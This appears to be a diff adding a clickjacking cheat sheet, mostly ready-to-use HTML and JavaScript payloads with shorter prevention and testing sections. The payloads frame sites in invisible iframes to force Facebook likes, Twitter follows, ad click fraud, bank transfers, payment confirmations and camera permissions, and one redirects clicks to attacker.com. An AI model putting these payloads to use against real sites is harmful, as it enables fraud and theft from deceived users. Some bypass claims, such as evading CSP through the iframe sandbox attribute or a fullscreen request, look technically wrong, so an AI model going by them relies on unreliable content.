@@ -1,0 +1,201 @@
+### **1. Basic Clickjacking Techniques**
+
+1. **Simple iFrame Clickjacking**
+   ```html
+   <iframe src="http://victim.com" style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;"></iframe>
+   ```
+   - This hides the iframe and overlays it over the user's screen, tricking them into clicking the hidden element.
+
+2. **Clickjacking Using CSS Styles**
+   ```html
+   <iframe src="http://victim.com" style="opacity: 0.01; position: absolute; top: 0; left: 0; height: 500px; width: 500px;"></iframe>
+   ```
+   - Using very low opacity (`0.01`) allows the user to see their own interface but subtly interact with the iframe.
+
+3. **Hidden Button in a Transparent Frame**
+   ```html
+   <button style="position: absolute; top: 0; left: 0; opacity: 0;">Hidden Button</button>
+   ```
+   - Tricking users by overlaying a button on the targeted action.
+
+4. **Double Frame Clickjacking (Nested iframes)**
+   ```html
+   <iframe src="clickjack_iframe.html" style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;"></iframe>
+   ```
+   - Embedding multiple iframes makes detection more difficult by hiding the actual action inside deeper levels of frames.
+
+### **2. Advanced Clickjacking Techniques**
+
+1. **Frame Busting Bypass Using JavaScript**
+   - Sometimes websites implement frame-busting scripts (like `if (top !== self) top.location = self.location;`). This can be bypassed by disabling JavaScript or modifying scripts with browser plugins.
+   
+2. **Overlapping Elements via CSS to Hide Buttons**
+   ```html
+   <div style="position: absolute; top: 0; left: 0; background: transparent; height: 100%; width: 100%; z-index: 100;">
+       <iframe src="http://victim.com" style="opacity: 0; z-index: 10;"></iframe>
+   </div>
+   ```
+   - This overlays the entire page but hides the iframe beneath transparent elements.
+
+3. **Click Event Redirection with JavaScript**
+   ```javascript
+   document.getElementById('invisibleIframe').onclick = function() {
+       window.top.location = 'http://attacker.com';
+   };
+   ```
+   - The click event triggers a redirection or action on the attacker's chosen page.
+
+### **3. Common Clickjacking Payloads**
+
+1. **Facebook Like Clickjacking Payload**
+   ```html
+   <iframe src="https://www.facebook.com/plugins/like.php?href=https://attacker.com&layout=button" style="opacity: 0; position: absolute; top: 0; left: 0; width: 450px; height: 80px;"></iframe>
+   ```
+   - Trick users into "liking" a specific page.
+
+2. **Bank Transfer Clickjacking Payload**
+   - If the victim’s bank web page is vulnerable:
+   ```html
+   <iframe src="http://bank.com/transfer?to=attacker&amount=1000" style="opacity: 0; height: 100%; width: 100%;"></iframe>
+   ```
+   - Embeds a bank transfer page with pre-filled values.
+
+### **4. Clickjacking Prevention Techniques**
+
+1. **X-Frame-Options Header**
+   - Use the HTTP header `X-Frame-Options` to prevent embedding:
+     - **DENY**: Prevents the page from being displayed in any frame.
+       ```http
+       X-Frame-Options: DENY
+       ```
+     - **SAMEORIGIN**: Allows the page to be displayed only if the origin matches.
+       ```http
+       X-Frame-Options: SAMEORIGIN
+       ```
+     - **ALLOW-FROM**: Specifies allowed origins to embed the page (limited browser support).
+       ```http
+       X-Frame-Options: ALLOW-FROM https://trusted.com
+       ```
+
+2. **Content Security Policy (CSP) Frame-Ancestors**
+   - A more flexible approach compared to `X-Frame-Options`.
+   ```http
+   Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
+   ```
+   - This allows you to specify who is allowed to embed the page in a frame.
+
+3. **JavaScript Frame Busting (Deprecated but sometimes useful)**
+   ```javascript
+   if (top !== self) {
+       top.location = self.location;
+   }
+   ```
+   - This prevents the current page from being loaded in an iframe. However, sophisticated attackers can sometimes bypass it.
+
+4. **Double-Click Confirmation or UI Redundancy**
+   - Design the interface so that the user has to double-click or confirm actions, ensuring that the user knows what they are doing.
+
+### **5. Clickjacking Demonstration Examples**
+
+1. **Using Transparent Layers to Click Ads**
+   - Overlaying transparent iframe ads on top of a regular page can be used for click fraud.
+   ```html
+   <iframe src="https://adnetwork.com/ad" style="opacity: 0.01; height: 300px; width: 300px; position: absolute; top: 0; left: 0;"></iframe>
+   ```
+
+2. **Clickjacking with Social Media Share**
+   - Embed a Twitter or Instagram follow button to gain social followers.
+   ```html
+   <iframe src="https://twitter.com/intent/follow?screen_name=attacker" style="opacity: 0; width: 500px; height: 500px;"></iframe>
+   ```
+
+3. **Clickjacking with Hidden Actions (Mouse Tracking)**
+   - Track the user’s mouse to align with buttons in an iframe.
+   ```html
+   <iframe id="victimFrame" src="http://victim.com" style="opacity: 0; position: absolute; left: 0; top: 0;"></iframe>
+   <script>
+       document.onmousemove = function(e) {
+           document.getElementById('victimFrame').style.left = e.pageX + 'px';
+           document.getElementById('victimFrame').style.top = e.pageY + 'px';
+       }
+   </script>
+   ```
+
+### **6. Clickjacking with Nested Iframes and Timers**
+
+1. **Using Timers to Display Iframes Momentarily**
+   ```html
+   <script>
+       setTimeout(function() {
+           document.getElementById("iframe").style.opacity = "1";
+       }, 3000);
+   </script>
+   <iframe id="iframe" src="http://victim.com" style="opacity: 0; height: 100%; width: 100%;"></iframe>
+   ```
+   - Show the iframe after a short delay when the user is most likely to interact.
+
+2. **Nested Iframes to Hide the Target URL**
+   ```html
+   <iframe src="iframe1.html" style="opacity: 0; position: absolute; top: 0; left: 0;"></iframe>
+   <!-- iframe1.html contains another iframe pointing to the real target -->
+   ```
+   - The real target is embedded multiple layers deep, making it harder to identify.
+
+### **7. Clickjacking Payloads Targeting Specific Features**
+
+1. **Clickjacking to Enable Web Camera or Microphone**
+   ```html
+   <iframe src="http://victim.com/settings" style="opacity: 0; position: absolute; top: 0; left: 0;"></iframe>
+   ```
+   - Tricking users to enable hardware permissions.
+
+2. **Clickjacking a Logout Button**
+   ```html
+   <iframe src="http://victim.com/logout" style="opacity: 0; height: 100%; width: 100%;"></iframe>
+   ```
+   - Forcing users to unknowingly click a logout button.
+
+3. **Clickjacking a Payment Confirmation Button**
+   ```html
+   <iframe src="http://bank.com/confirm_payment" style="opacity: 0; width: 100%; height: 100%;"></iframe>
+   ```
+   - Embed the iframe with a payment confirmation screen to trigger a money transfer.
+
+### **8. Testing for Clickjacking Vulnerabilities**
+
+1. **Simple Clickjacking Test Page**
+   ```html
+   <!DOCTYPE html>
+   <html>
+   <body>
+       <h1>Clickjacking Test Page</h1>
+       <iframe src="http://victim.com" style="height: 500px; width: 500px;"></iframe>
+   </body>
+   </html>
+   ```
+   - Create this page to verify if the target website can be embedded.
+
+2. **Automated Tools for Clickjacking Detection**
+   - Use tools like **OWASP ZAP**, **Burp Suite**, or **Nmap NSE Scripts** to scan and detect if a site is vulnerable to clickjacking.
+
+### **9. Countermeasures: Clickjacking Prevention Summary**
+
+1. **X-Frame-Options Header**: Add the `X-Frame-Options: DENY` or `SAMEORIGIN` header.
+2. **Content Security Policy (CSP)**: Add a CSP directive to control who can embed your content.
+3. **User Awareness**: Design user interfaces to make unintended clicks more difficult.
+4. **JavaScript Busting**: Although not foolproof, using JavaScript to prevent framing might add another layer of defense.
+5. **Multi-Factor Authentication (MFA)**: Reduces the risk of critical actions being clicked by requiring additional user verification.
+
+### **10. Common Clickjacking Payload Bypasses**
+
+1. **Clickjacking Bypass Using Fullscreen APIs**
+   - Exploit fullscreen requests in modern browsers:
+   ```html
+   <button onclick="document.body.requestFullscreen(); alert(1);">Go Fullscreen and Click</button>
+   ```
+
+2. **Bypassing CSP Using `sandbox` Attribute**
+   ```html
+   <iframe src="http://victim.com" sandbox="allow-scripts"></iframe>
+   ```
+   - Use different combinations of sandbox attributes to test if CSP can be bypassed.
